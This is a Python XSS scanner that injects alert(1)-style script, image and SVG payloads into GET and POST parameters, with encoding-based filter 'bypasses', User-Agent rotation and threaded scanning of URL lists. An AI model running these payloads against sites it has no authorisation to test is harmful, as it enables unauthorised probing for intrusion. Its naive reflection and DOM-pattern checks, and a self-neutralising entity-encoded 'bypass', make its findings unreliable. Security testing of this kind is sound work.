import requests
from bs4 import BeautifulSoup
from urllib.parse import quote, urlparse
import json
import threading
import argparse
import csv
from datetime import datetime
import random
import os

# Function to log results to a file (supports CSV and plain text)
def log_result(log_file, message, csv_log=False):
    if csv_log:
        with open(log_file, 'a', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(message)
    else:
        with open(log_file, 'a') as f:
            f.write(message + "\n")

# Function to encode payloads to bypass filters
def encode_payload(payload):
    return quote(payload)

# Function to create bypass techniques for XSS payloads
def bypass_techniques(payload):
    return [
        payload,
        encode_payload(payload),
        payload.replace("<", "&lt;").replace(">", "&gt;"),  # HTML entity encoding
        payload.replace(" ", "%20"),  # Space encoding
        payload.replace("'", "&#x27;")  # Single quote encoding
    ]

# Function to check for DOM-based XSS
def check_dom_xss(response_content):
    dom_xss_patterns = ["document.write", "eval(", "innerHTML", "setTimeout", "setInterval", "window.location"]
    for pattern in dom_xss_patterns:
        if pattern in response_content:
            return f"[+] Potential DOM-based XSS vulnerability detected with pattern: {pattern}"
    return "[-] No DOM-based XSS patterns detected."

# Function to test XSS vulnerability on a single URL
def check_xss(url, params, payload, method="GET", headers=None, cookies=None, log_file="xss_log.txt", csv_log=False):
    try:
        # Rotate User-Agent
        headers['User-Agent'] = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/93.0'
        ])

        # Make the request
        response = None
        if method.upper() == "GET":
            response = requests.get(url, params=params, headers=headers, cookies=cookies, timeout=10)
        elif method.upper() == "POST":
            response = requests.post(url, data=params, headers=headers, cookies=cookies, timeout=10)

        # Check if the response is valid
        if response is None:
            print(f"[!] No response from {url}")
            return

        # Parse the response content
        soup = BeautifulSoup(response.content, 'html.parser')

        # Check if the payload is reflected in the response
        for key, value in params.items():
            if value in str(soup):
                result = f"[+] XSS vulnerability found at: {url} using {method} with payload: {payload} in parameter {key}"
                print(result)
                log_result(log_file, [url, method, payload, "Vulnerable", response.status_code, datetime.now()], csv_log)
            else:
                result = f"[-] No XSS vulnerability found at: {url} using {method} with payload: {payload} in parameter {key}"
                print(result)
                log_result(log_file, [url, method, payload, "Not Vulnerable", response.status_code, datetime.now()], csv_log)

        # Check for DOM-based XSS
        dom_result = check_dom_xss(response.text)
        log_result(log_file, [url, "DOM Check", dom_result, datetime.now()], csv_log)
        print(dom_result)

    except requests.Timeout:
        print(f"[!] Timeout occurred for {url}")
    except requests.RequestException as e:
        print(f"[!] Network error occurred: {e}")
    except Exception as e:
        print(f"[!] Error occurred: {e}")

# Function to construct query params with payload for all parameters
def construct_params(params, payload):
    return {param: payload for param in params}

# Function to test XSS on multiple URLs from a list
def test_xss_multiple_urls(url_list, payloads, methods, headers=None, cookies=None, log_file="xss_log.txt", csv_log=False):
    for target in url_list:
        url = target['url']
        params = target.get('params', {})

        for payload in payloads:
            # Apply bypass techniques to the payload
            for modified_payload in bypass_techniques(payload):
                for method in methods:
                    print(f"Testing {method} request on {url} with payload: {modified_payload}")
                    test_params = construct_params(params, modified_payload)
                    check_xss(url, test_params, modified_payload, method=method, headers=headers, cookies=cookies, log_file=log_file, csv_log=csv_log)

# Function to load URLs and parameters from a JSON file
def load_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        return json.load(file)

# Function to run XSS tests in parallel using threading
def run_parallel_tests(url_list, payloads, methods, headers=None, cookies=None, log_file="xss_log.txt", num_threads=5, csv_log=False):
    def worker(url_chunk):
        test_xss_multiple_urls(url_chunk, payloads, methods, headers, cookies, log_file, csv_log)
    
    chunk_size = max(1, len(url_list) // num_threads)  # Ensure at least 1 URL per thread
    threads = []

    for i in range(0, len(url_list), chunk_size):
        url_chunk = url_list[i:i + chunk_size]
        thread = threading.Thread(target=worker, args=(url_chunk,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Command-line interface using argparse
def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Scanner")
    
    parser.add_argument('--url', type=str, help="URL to scan for XSS vulnerabilities")
    parser.add_argument('--file', type=str, help="JSON file containing multiple URLs and parameters")
    parser.add_argument('--headers', type=str, help="Custom headers in JSON format", default=None)
    parser.add_argument('--cookies', type=str, help="Custom cookies in JSON format", default=None)
    parser.add_argument('--log', type=str, help="Log file to save results", default="xss_log.txt")
    parser.add_argument('--csv_log', action='store_true', help="Log results in CSV format")
    parser.add_argument('--threads', type=int, help="Number of threads to use for parallel testing", default=5)
    parser.add_argument('--payloads', type=str, help="File containing custom payloads", default=None)

    args = parser.parse_args()

    # Load payloads from file if provided
    if args.payloads:
        with open(args.payloads, 'r') as f:
            payloads = f.read().splitlines()
    else:
        payloads = [
            "<script>alert(1)</script>",
            "'\"><script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "\"'><iframe src=javascript:alert(1)>",
            "javascript:alert(1)//",
            "<body onload=alert(1)>",
            "' OR '1'='1';--",
        ]

    # Request methods to test
    methods = ["GET", "POST"]

    # Parse custom headers and cookies if provided
    headers = json.loads(args.headers) if args.headers else {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
    }
    
    cookies = json.loads(args.cookies) if args.cookies else {'session_id': '1234567890abcdef'}

    # If a file is provided, load the URLs from the file
    if args.file:
        url_list = load_urls_from_file(args.file)
        run_parallel_tests(url_list, payloads, methods, headers, cookies, log_file=args.log, num_threads=args.threads, csv_log=args.csv_log)
    
    # If a single URL is provided, scan that URL
    elif args.url:
        target = {
            "url": args.url,
            "params": {"q": ""}  # Modify the parameters as needed
        }
        test_xss_multiple_urls([target], payloads, methods, headers, cookies, log_file=args.log, csv_log=args.csv_log)

if __name__ == "__main__":
    main()
